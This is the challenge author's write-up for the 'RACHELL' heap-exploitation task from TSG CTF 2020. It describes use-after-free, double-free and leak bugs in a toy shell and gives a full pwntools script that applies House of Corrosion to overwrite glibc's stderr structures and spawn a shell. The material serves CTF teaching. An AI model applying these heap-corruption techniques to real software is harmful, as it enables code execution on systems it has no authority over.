# RACHELL  
  
## Abstraction  
The distributed program simulates a pseudo file system and a so simplified
shell.  
Users can use following commands.  
- cd: change working directory    
- mkdir: make a directory    
- touch: make a file and initiate its management structure    
- echo: print given strings or write them into a file    
- mv: move a file or a directory    
- rm: remove a file or a directory    
- ls: list directory content    
- pwd: print a name of current working directory  
- exit: make the program halt  

"cat" command is not implemented, so users can't see the file content.  
In addition, the directory name shown by "ls" command is chechekd before
printed by ascii\_check() function. This function checks whether the file name
contains only allowed characters or not.  

## Unintended bug and unintended solution  
The main policy of this program is "completely leakess".  
Almost all outputs are hard-coded and other variable outputs are checked by
ascii\_check().  
However, "pwd" command prints a node name without ascii\_check if its parent
node isn't root directory.  

```c  
void sub_pwd(struct node *d)  
{  
 if(d->p == &root){  
   write(1,"/",1);  
   print_name_with_check(d);  
   return;  
 }  
 sub_pwd(d->p);  
 write(1,"/",1);  
 write(1,d->name,strlen(d->name)); // awful mistake  
}  
```

This is a totally awful mistake of mine and collapsed the main policy of this
problem fundamentally. I should have coded as follow.  
```c  
 //sub_pwd(d->p);  
 //write(1,"/",1);  
 //write(1,d->name,strlen(d->name)); // awful mistake  
 sub_pwd(d->p);  
 write(1,"/",1);  
 if(ascii_check(d->name,strlen(d->name))==1)  
   write(1,d->name,strlen(d->name));  
 else  
   panic();  
```

Therefore, this program is no more leakless now. You can leak libcbase and use
heap corruptions, which enables you to overwrite some function-hooks
relatively easily.  
Some solutions which use any leak are here.  
[CTFするぞ by @ptrYudai](https://ptr-yudai.hatenablog.com/#Pwn-322pts-
RACHELL-7-solves)  
[writeups by @shift_crops](https://github.com/shift-
crops/CTFWriteups/tree/2020/2020/TSG%20CTF/RACHEL)  

I'm so sorry if you feel this problem is somewhat boring due to this terrible
mistake.  

## Intended bug  
Let me count the intended bugs.  
  
### UAF and double free  
In sub\_rm() function called by "rm" command, the node structure and a buffer
of a file or a directory are freed. Additionally, a freed node is unlinked
from its parent by unlink\_child() function.  

```c  
void sub_rm(struct node *target)  
{  
 if(target == &root){  
   write(1,"not allowed\n",12);  
   return;  
 }  
 if(target->p == cwd){  
   switch(target->type){  
     case FIL:  
       if(target->buf != NULL)  
         free(target->buf);  
       unlink_child(target);  
       break;  
     case DIR:  
       unlink_child(target);  
       free(target);  
       break;  
     default:  
       panic();  
   }  
 }else{  
   switch(target->type){  
     case FIL:  
       if(target->buf != NULL)  
         free(target->buf);  
       break;  
     case DIR:  
       unlink_child(target);  
       free(target);  
       break;  
     default:  
       panic();  
   }  
 }  
}  
```

However, if the parent of the node is not a root directory, the node of the
file is not unlinked even though its buffer is freed. Due to this bug, you can
free the same node multiple times (double free) and write on the freed buffer
(UAF).  

### incorrect NULL termination  
When you write strings into a file, the program reads input byte to byte and
allocate a buffer, based on the size of the input. After that, it memcopy()
the input on the allocated buffer. Basically, if you want a buffer whose size
is 0x500, you have to send "A"*0x500 and all of them are written on the
buffer. Therefore, almost all of the allocated space is filled with your input
and they might collapse the valid information on the memory when exploit,
leading failure of an attack. (Please imagine you want to allocate a huge
buffer, but want to overwrite only two bytes.)  
However, write2file() is implemented as follow.  
```c  
 if(target->buf == NULL){  
   target->buf = malloc(size);  
   // find newline  
   for(int ix=0; ix!=size; ++ix){  
     if(content[ix] == '\r'){  
       size = ix;  
       break;  
     }  
   }  
   memcpy(target->buf,content,size);  
   target->size = size;  
```  
It regards "\r" as a special character even though newline is already NULL
terminated in readn() function. If you use send "\r"*0x500, the program
allocate a buffer whose size is 0x500, but it memcopy() 0 byte actually in
this function. This would make a whole exploit easy.  
  
  
Following features are not bugs, but characteristic or inappropriate
implementations.  

### too huge buffer  
The program allocates a too huge sysbuf(0x5000) when inits. Once it is
allocated, the buffer is never freed or reallocated. It also makes exploit
easier because you don't have to consider the reallocation of the buffer.

### not used stdout/stdin stream  
All outputs and inputs are via write()/read() functions. Therefore, you can't
leak any information by the well-known technique, which overwrites
\_\_IO\_write\_ptr of stdout and forces ouput of the stream buffer.  

### halt instead of exit  
The program halts by infinite sleep() in panic() function. Therefore, you
can't easily call exit() function.  
  

# Rough overview of exploit  
This program is/was intended to be "completely leakless". Therefore, you have
to get a shell without any libc information. Here is the very situation where
House of Corrosion is useful.  
If you are new to this technique, please refer to following pages.  

[Suggestion of House of Corrosion by CptGibbon
(En)](https://github.com/CptGibbon/House-of-Corrosion)  
[My PoC of House of Corrosion
(Jp)](https://smallkirby.hatenablog.com/entry/2020/02/24/210633)  
  
In short, the exploit follows below steps.  
- use largebin with NON\_MAIN\_ARENA flag on to cause an error    
- overwrite vtable of stderr and make it call \_IO\_str\_overflow when an error    
- in this function, a crafted function pointer is used and an one-gadget is invoked    
  
In this problem, two buffers would be allocated when you want to write content
into a file. One is for a node management structure, and another is for
content buffer. You can use "touch" command to allocate only the former buffer
beforehand. It would make exploit easier because you don't care the allocation
of the latter buffer when allocating crafted chunks.

# Exploit  
The adrress of libc symbols are randomized except for their last 3 nibbles.
When you overwrite global\_max\_fast by unsortedbin attack, you would
overwrite the last 2 bytes of valid fd of an unsorted chunk. Therefore, this
attack has 4-bit entropy. (Actually, this PoC has 4+x bit entropy, where x is
small.)  
  
```python  
#!/usr/bin/env python  
#encoding: utf-8;

from pwn import *  
import sys  
import time

FILENAME = "../dist/rachell"  
LIBCNAME = "../dist/libc.so.6"

hosts = ("uouo","localhost","localhost")  
ports = (25252,12300,25252)  
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server  
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost  
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker  
context(os='linux',arch='amd64')  
binf = ELF(FILENAME)  
libc = ELF(LIBCNAME) if LIBCNAME!="" else None

## utilities #########################################

def hoge(command):  
 c.recvuntil("command> ")  
 c.sendline(command)

def ls(dir="."):  
 hoge("ls")  
 c.recvuntil("path> ")  
 c.sendline(dir)

# current dir only  
def touch(name):  
 hoge("touch")  
 c.recvuntil("filename> ")  
 c.sendline(name)

def echo(path,content):  
 if "\n" in content:  
   raw_input("[w] content@echo() contains '\\n'. It would be end of input.
OK?")

 hoge("echo")  
 c.recvuntil("arg> ")  
 c.sendline(content)  
 c.recvuntil("redirect?> ")  
 c.sendline("Y")  
 c.recvuntil("path> ")  
 c.sendline(path)  
 if "invalid" in c.recvline():  
   raw_input("error detected @ echo()")  
   exit()

def rm(path):  
 hoge("rm")  
 c.recvuntil("filename> ")  
 c.sendline(path)  
 if "no" in c.recvline():  
   raw_input("error detected @ rm()")  
   exit()

# relative only  
def cd(path):  
 hoge("cd")  
 c.recvuntil("path> ")  
 c.sendline(path)

# current dir only  
def mkdir(name):  
 hoge("mkdir")  
 c.recvuntil("name")  
 c.sendline(name)

def te(filename,content):  
 touch(filename)  
 echo(filename,content)

def formula(delta):  
 return delta*2 + 0x20

## exploit ###########################################

def exploit():  
 global c  
 repeat_flag = False

 # calc ##############################################

 gmf = 0xc940  
 bufend_s = formula(0xa70 - 0x8)  
 stderralloc_s = formula(0xb08)  
 dumpedend_s = formula(0x1ce0)  
 pedantic_s = formula(0x1cf8 - 0x8)  
 stderrmode_s = formula(0xaf0 - 0x8)  
 stderrflags_s = formula(0xa30 - 0x8)  
 stderrwriteptr_s = formula(0xa58 - 0x8)  
 stderrbufbase_s = formula(0xa68 - 0x8)  
 stderrvtable_s = formula(0xa68 + 0xa0 - 0x8)  
 stdoutmode_s = formula(0xbd0 - 0x8)  
 morecore_s = formula(0x880)  
 stderrbufend_s = formula(0xa68)  
 stderr_s = formula(0x7f17c6744680-0x7f17c6743c40+0x10 - 0x28)  
 stderr60_s = formula(0x7f17c6744680-0x7f17c6743c40+0x10 - 0x28 + 0x60)  
 LSB_IO_str_jmps = 0x7360  
 LSBs_call_rax = 0x03d8            # call rax gadget. to be called @
_IO_str_overflow()  
 '''  
 pwndbg> find /2b 0x7f971f8a0000, 0x7f971f8affff, 0xff,0xd0  
 0x7f971f8a03d8 <systrim+200>  
 0x7f971f8a0657 <ptmalloc_init+631>  
 2 patterns found.  
 '''

 try:  
     mkdir("test1")  
     mkdir("test2")  
     mkdir("test3")  
     mkdir("test4")  
     mkdir("test5")  
     mkdir("test6")  
     # info: test6 is used only for padding!  
     for i in range(5):  
       cd("./test"+str(i+2))  
       for j in range(0xe):  
         touch(str(j+1))  
       cd("../")  
     print("[+] pre-touched chunks")

     cd("./test1")  
     touch("a")  
     touch("k")  
     touch("large")  
     touch("b")  
     touch("c")  
     touch("LARGE")  
     echo("a","A"*0x450)         # for unsortedbin attack  
     echo("k","k"*0x130)         # just for padding  
     echo("large","B"*0x450)  
     echo("b","A"*0x450)         # to overwrite LARGE's size !!!  
     cd("../")  
     rm("./test1/b")  
     rm("./test1/large")  
     cd("test1")  
     echo("c","\r"*0x460)  
     echo("LARGE","L"*0x460)     # to cause error!!!

     touch("hoge")  
     touch("hoge2")  
     te("padding","K"*0x30)      # JUST PADDING

     print("[+] prepared for later attack")

     # prepare for ADV3  part1 in test2 ##########################

     # get overlapped chunk.  
     LSB_A1 = 0xd0              # chunk A's LSB  
     adv3_size1 = bufend_s  
     cd("../test2")  
     echo("1","\r"*(0x50))  
     echo("2","2"*(0x20)) # A  
     #raw_input("check A's LSB")  
     echo("3","3"*(0x20)) # B  
     echo("4","4"*(0x50))  
     cd("../")  
     rm("./test2/1")  
     rm("./test2/4")  
     cd("test2")  
     echo("4",p8(LSB_A1))  
     echo("5","5"*(0x50)) # tmp2  
     echo("6","6"*(0x50)) # tmp1 overlapping on A  
     echo("6",p64(0)+p64(adv3_size1 + 0x10 +0x1) + p64(0)*4 + p64(0) + p64(adv3_size1 + 0x10 + 0x1))  
  
     # prepare fakesize  
     echo("7",(p64(0)+p64(0x31))*((adv3_size1+0x120)//0x10))  
     #raw_input("check overlap")

     print("[+] create overlapped chunks for ADV3 part1")  
     cd("../")

     # prepare for ADV3  part2 in test3 ##########################

     # padding  
     cd("./test6/")  
     echo("1",p64(0x31)*0x10)

     # get overlapped chunk.  
     LSB_A2 = 0xa0              # chunk A's LSB  
     adv3_size2 = stderralloc_s  
     cd("../test3")  
     echo("1","\r"*(0x50))  
     echo("2","2"*(0x20)) # A  
     #raw_input("check A's LSB")  
     echo("3","3"*(0x20)) # B  
     echo("4","4"*(0x50))  
     cd("../")  
     rm("./test3/1")  
     rm("./test3/4")  
     cd("test3")  
     echo("4",p8(LSB_A2))  
     echo("5","5"*(0x50)) # tmp2  
     echo("6","6"*(0x50)) # tmp1 overlapping on A  
     echo("6",p64(0)+p64(adv3_size2 + 0x10 +0x1) + p64(0)*4 + p64(0) + p64(adv3_size2 + 0x10 + 0x1))

     # prepare fakesize  
     echo("7",(p64(0)+p64(0x31))*((adv3_size2+0x120)//0x10))  
     #raw_input("check overlap")

     print("[+] create overlapped chunks for ADV3 part2")  
     cd("../")

     # Allocate chunks for ADV2 #################################

     cd("./test4")  
     print("[ ] dumpedend_s: "+hex(dumpedend_s))  
     echo("1","B"*dumpedend_s)  
     echo("2","B"*pedantic_s)  
     echo("3","B"*stderrmode_s)  
     echo("4","B"*stderrflags_s)  
     echo("5","B"*stderrwriteptr_s)  
     echo("6","B"*stderrbufbase_s)  
     echo("7","B"*stderrvtable_s)  
     echo("8","B"*stdoutmode_s)  
     print("[+] create some chunks for ADV2")  
     cd("../")

     # Connect to largebin and set NON_MAINARENA to 1 ######

     rm("./test1/LARGE")  
     cd("./test6")                       # connect to largebin  
     echo("2","\r"*0x600)

     cd("../test1")  
     echo("b",p64(0)+p64(0x460|0b101))   # set NON_MAIN_ARENA  
     cd("../")  
     print("[+] connected to large and set NON_MAIN_ARENA")

     # Unsortedbin Attack ###################################  
     rm("test1/a")  
     cd("./test1")  
     echo("a",p64(0)+p16(gmf-0x10))  
     echo("hoge","G"*0x450) # unsortedbin attack toward gmf  
     cd("../")  
     print("[!] Unsortedbin attack success??(4-bit entropy)")

     # Make unsortedbin's bk valid ########################  
     rm("./test4/1")  
     cd("test4")  
     echo("1",p64(0x460))  
     cd("../test5")  
     echo("1","\r"*dumpedend_s)  
     rm("../test4/2")  
     cd("../")  
     print("[*] made unsortedbin's bk valid")

     # Overwrite FILE of stderr ##########################

     # stderr_mode / 1  
     rm("./test4/3")  
     cd("./test4")  
     echo("3",p64(0x1))  
     cd("../test5")  
     echo("2","\r"*stderrmode_s)  
     cd("../")  
     print("[1/5] overwrite FILE of stderr")

     # stdout_mode / 1  
     rm("./test4/8")  
     cd("./test4")  
     echo("8",p64(0x1))  
     cd("../test5")  
     echo("3","\r"*stdoutmode_s)  
     cd("../")  
     print("[2/5] overwrite FILE of stderr")

     # stderr_flags / 0  
     rm("./test4/4")           # NO NEED IN THIS CASE...  
     cd("./test4")  
     echo("4",p64(0x0))  
     cd("../test5")  
     echo("4","\r"*stderrflags_s)  
     cd("../")  
     print("[3/5] overwrite FILE of stderr")

     # stderr_IO_write_ptr / 0x7fffffffffffffff  
     rm("./test4/5")  
     cd("./test4")  
     echo("5",p64(0x7fffffffffffffff))  
     cd("../test5")  
     echo("5","\r"*stderrwriteptr_s)  
     cd("../")  
     print("[4/5] overwrite FILE of stderr")

     # stderr_IO_buf_base / offset of default_morecore_onegadget  
     off_default_morecore_one = 0x4becb  
     rm("./test4/6")  
     cd("./test4")  
     echo("6",p64(off_default_morecore_one))  
     cd("../test5")  
     echo("6","\r"*stderrbufbase_s)  
     cd("../")  
     print("[5/5] overwrite FILE of stderr")

     # Transplant __morecore value to stderr->file._IO_buf_end ########  
     cd("../")  
     rm("./test2/2")  
     rm("./test2/3")                   # connect to tcache  
     cd("test2")  
     echo("2",p8(LSB_A1))  
     cd("../test6")  
     echo("3","\r"*stderrbufend_s)  
     cd("../test2")  
     echo("6",p64(0)+p64(0x10 + morecore_s|1))  
     cd("../")  
     rm("./test2/2")  
     cd("./test2/")  
     echo("6",p64(0)+p64(0x10 + stderrbufend_s|1))  
     cd("../test6")  
     echo("4","\r"*stderrbufend_s)

     cd("../test2")  
     echo("6",p64(0)+p64(0x10 + morecore_s|1))  
     cd("../test6")  
     echo("5","\r"*morecore_s)  
     print("[+]overwrite stderr->file.IO_buf_end")

     # Partial Transplantation: stderr->file.vtable into _IO_str_jumps

     cd("../")  
     rm("./test4/7")  
     cd("./test4")  
     echo("7",p16(LSB_IO_str_jmps - 0x20))            # 0-bit uncertainity after success of unsortedbin attack (before, 4bit)  
     cd("../test6")  
     echo("6","\r"*stderrvtable_s)  
     print("[+] overwrite stderr's vtable into _IO_str_jumps - 0x20")

     # Tamper in Flight: Transplant __morecore's value to _s._allocate_buffer ###########  
     cd("../")  
     rm("./test3/3")  
     rm("./test3/2")                   # connect to tcache  
     cd("test3")  
     echo("2",p8(LSB_A2))  
     cd("../test6")  
     echo("7","\r"*stderralloc_s)  
     cd("../test3")

     echo("6",p64(0)+p64(0x10 + morecore_s|1))  
     cd("../")  
     rm("./test3/2")  
     cd("./test3/")  
     echo("6",p64(0)+p64(0x10 + stderralloc_s|1))  
     echo("2",p16(LSBs_call_rax))                      # HAVE 4-BIT UNCERTAINITY !!!  
     cd("../test6")  
     echo("8","\r"*stderralloc_s)  
     print("[ ] morecore_s: "+hex(morecore_s))

     # invoke and get a shell!!!  
     c.recvuntil("command> ")  
     c.sendline("echo")  
     c.recvuntil("arg> ")  
     c.sendline("\r"*0x50)  
     c.recvuntil("?> ")  
     c.sendline("Y")  
     c.recvuntil("> ")  
     c.sendline("9")  
     print("[!] Got shell???")

     return True  
 except EOFError:  
     print("[-] EOFError")  
     c.close()  
     return False

## main ##############################################

# check success rate by 'python2 ./exploit.py r bench'  
# solvable-check by python2 ./exploit.py r

if __name__ == "__main__":  
   global c  
  
   if len(sys.argv)>1:  
     if sys.argv[1][0]=="d":  
       cmd = """  
         set follow-fork-mode parent  
       """  
       c = gdb.debug(FILENAME,cmd)

     elif sys.argv[1][0]=="r" or sys.argv[1][0]=="v":  
       try_count = 0  
       total_try = 0  
       total_success = 0  
       start_time = time.time()  
       init_time = time.time()  
       while True:  
           lap_time = time.time()  
           try_count += 1  
           print("**** {} st try ****".format(hex(try_count)))  
           if sys.argv[1][0] == "r":  
               c = remote(rhp1["host"],rhp1["port"])  
           else:  
               c = remote(rhp3["host"],rhp3["port"])  
           if exploit()==False:  
             print("----- {} st try FAILED: {} sec\n".format(hex(try_count),time.time()-lap_time))  
             continue  
           else:  
               print("----- {} st try SUCCESS: {} sec (total)".format(hex(try_count),time.time()-start_time))  
               if len(sys.argv) > 2 :      # check success rate  
                   print("\n***** NOW SUCCESS NUM: {} ******\n".format(hex(total_success + 1)))  
                   total_try += try_count  
                   try_count = 0  
                   total_success += 1  
                   start_time = time.time()  
                   if total_success >= 0x10:  
                       print("\n\n\nTotal {} Success in {} Try. Total Time: {} sec\n\n\n".format(hex(total_success),hex(total_try),time.time()-init_time))  
                       exit()  
                   else:  
                       continue  
               else:  
                   c.interactive()  
                   exit()

   else:  
       c = remote(rhp2['host'],rhp2['port'])

   exploit()  
   c.interactive()  
```

Original writeup (https://github.com/tsg-
ut/tsgctf2020/blob/master/pwn/rachell/WRITEUP.md).